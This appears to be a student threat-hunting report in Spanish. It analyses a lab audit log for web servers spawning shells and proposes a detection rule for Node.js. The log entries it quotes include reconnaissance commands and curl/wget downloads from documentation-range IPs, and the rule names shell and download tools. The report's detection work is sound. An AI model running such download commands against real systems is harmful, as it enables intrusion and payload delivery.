# Detección y caza — Grupo 05

**Integrantes:** Juan Ignacio Atencio, Ian Vidmar, Patricio Borda · **Fecha:** 29/10/2026

---

## 1. Hipótesis de caza

Si una aplicación web vulnerable es explotada mediante ejecución de comandos, esperamos observar procesos hijos inusuales lanzados por los procesos de servicio: `apache2` ejecutando `sh`/`bash` y, especialmente, `node` ejecutando `sh`, `bash`, `curl` o `wget`. La actividad se concentra entre las 09:42 y las 09:44 UTC del 27/10/2026. Buscamos cadenas padre-hijo, comandos de reconocimiento (`id`, `uname -a`) y descargas desde direcciones externas.

## 2. Hallazgos en `audit.log`

| Timestamp (UTC) | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|---|---|
| 2026-10-27 09:42:17 | `web01` | `apache2` (PPID 812) → `sh` (PID 903), `sh -c id` | Sí | Un servidor web inicia un shell y ejecuta un comando de identificación de usuario; patrón compatible con ejecución de comandos desde la aplicación. |
| 2026-10-27 09:42:18 | `web01` | `sh` (PID 903) → `id` (PID 904) | Sí | Es el comando hijo de la shell iniciada por Apache. Corrobora la cadena anterior y parece reconocimiento posterior a la ejecución. |
| 2026-10-27 09:43:03 | `api01` | `node` (PPID 501) → `sh` (PID 601), `sh -c curl http://198.51.100.7/x` | Sí, alta prioridad | Un proceso Node.js inicia una shell que ejecuta `curl` contra una IP externa. No es un comportamiento habitual esperado de un servicio API y puede indicar ejecución arbitraria/descarga. |
| 2026-10-27 09:43:04 | `api01` | `sh` (PID 601) → `curl` (PID 602) | Sí, alta prioridad | Confirma la ejecución de curl derivada de Node. La IP `198.51.100.7` pertenece a un rango reservado para documentación (TEST-NET-2), por lo que el registro parece simulado/laboratorio y no prueba una conexión real a Internet. |
| 2026-10-27 09:44:22 | `web01` | `apache2` (PPID 812) → `wget` (PID 906) | Sí | Apache inicia `wget` con `http://198.51.100.9/a`; una descarga iniciada por el proceso web es indicio de posible payload o herramienta externa. |
| 2026-10-27 09:45:10 | `svc01` | `python` (PPID 701) → `sh` (PID 704), `sh -c uname -a` | Sospechoso, requiere contexto | Un servicio Python inicia shell para consultar información del sistema. Puede ser reconocimiento, pero también una comprobación legítima del servicio o del laboratorio. |
| 2026-10-27 09:45:11 | `svc01` | `sh` (PID 704) → `uname` (PID 705) | Sospechoso, requiere contexto | Corrobora el comando de reconocimiento `uname -a`; investigar junto con el evento anterior. |

**¿Hay compromiso?**  
**Indeterminado con la evidencia disponible, aunque hay indicios fuertes de ejecución de comandos sospechosa.** En `web01` se observa `apache2 → sh → id` y posteriormente un `wget`; en `api01`, `node → sh → curl`. Estas cadenas son compatibles con explotación de una aplicación y ejecución de comandos. El evento de `svc01` (`python → sh → uname -a`) también merece investigación. Sin embargo, el log no identifica usuario, solicitud HTTP, origen de la petición, resultado de la descarga ni ejecución posterior del archivo. Por eso no se puede confirmar por sí solo que hubo compromiso exitoso ni atribuirlo a una vulnerabilidad específica.

## 3. Falsos positivos

Una línea potencialmente sospechosa que podría ser legítima es `svc01` a las 09:45:10 UTC: `python` ejecuta `sh -c uname -a`. Un agente de diagnóstico, script de inventario o comprobación de compatibilidad podría consultar la versión del kernel.

Para distinguirlo:
- verificar si esa ejecución está documentada en el código o en tareas de mantenimiento;
- correlacionar con usuario, servicio, solicitud y ventana de cambio;
- comparar frecuencia y argumentos con la línea base;
- confirmar si ocurrió en otros hosts de manera habitual.

Las sesiones `db01: sshd → bash` (09:42:40, 09:44:10 y 09:49:00) no deben considerarse automáticamente maliciosas: son compatibles con sesiones SSH interactivas. Se deberían validar contra usuarios autorizados, IP de origen y registros de autenticación.

## 4. Regla propuesta para Node.js

**Idea de detección:** alertar cuando un proceso `node` (o un descendiente directo) cree `sh`, `bash`, `curl` o `wget`, especialmente si la línea de comandos contiene `-c`, una URL o una IP externa.

Pseudorregla:

```text
IF parent_process == "node"
AND (child_process IN ["sh", "bash", "curl", "wget"]
     OR descendant_process IN ["sh", "bash", "curl", "wget"])
THEN alert "Node.js lanzó shell o herramienta de descarga"
SEVERITY = high
```

**Qué observa:** relación padre-hijo, nombre del proceso y argumentos. La alerta debería conservar host, timestamp, PID/PPID, usuario, ejecutable y línea de comandos; correlacionar `node → sh → curl/wget` en una ventana breve mejora la precisión.

**Falso negativo posible:** si el atacante usa otro intérprete o herramienta (por ejemplo, `python`, `busybox`, `perl`), ejecuta código dentro del propio proceso Node sin crear procesos hijos, cambia el nombre del binario, o la telemetría no registra descendientes/argumentos, la regla puede no dispararse. También puede perderse la cadena si solo se observa el padre inmediato.

## 5. Limitaciones del log

- **Usuario/identidad:** no registra UID, usuario efectivo ni privilegios.
- **Origen:** no contiene IP de cliente, conexión, puerto ni solicitud HTTP que desencadenó el proceso.
- **Contexto de aplicación:** faltan URL/ruta, método HTTP, headers, parámetros, logs de Apache/Node/Python y correlación request-ID.
- **Resultado:** no indica código de salida, éxito de descarga, archivo creado ni ejecución posterior.
- **Telemetría:** solo muestra una selección de procesos; no incluye árbol completo, hashes, firma/ruta del binario, cambios de archivos, sockets o eventos de persistencia.
- **Retención y cobertura:** el fragmento abarca unos nueve minutos (09:40–09:49 UTC) y pocos eventos; no se conoce la política de retención ni si hay huecos.
- **Ruido y línea base:** faltan procesos normales esperados, inventario de tareas legítimas y frecuencia histórica para estimar falsos positivos.
- **Tiempo:** timestamps en UTC; se debe confirmar sincronización de relojes entre hosts.
- **IPs:** `198.51.100.7` y `198.51.100.9` pertenecen a rangos reservados para documentación; no deben tratarse como indicadores reales de Internet sin corroboración.

**Próximos datos a recolectar:** logs HTTP de Apache y aplicación Node/Python, autenticación SSH, UID/EUID, árbol de procesos completo, conexiones de red, hashes y metadatos de archivos descargados, y estado de los hosts durante el intervalo.
